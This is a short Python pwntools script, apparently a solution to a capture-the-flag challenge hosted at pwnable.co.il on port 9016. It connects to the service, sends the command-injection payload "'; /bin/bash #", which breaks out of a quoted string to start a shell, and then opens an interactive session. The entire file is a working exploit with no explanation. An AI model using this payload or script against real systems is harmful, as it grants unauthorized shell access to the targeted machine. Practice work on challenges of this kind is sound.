from pwn import *

def main():
	paylod = "'; /bin/bash #"
	conn = remote("pwnable.co.il", "9016")

	conn.recvline()
	conn.recvline()
	conn.sendline(paylod)
	conn.recvline()

	conn.interactive()
	
if __name__ == "__main__":
	main()
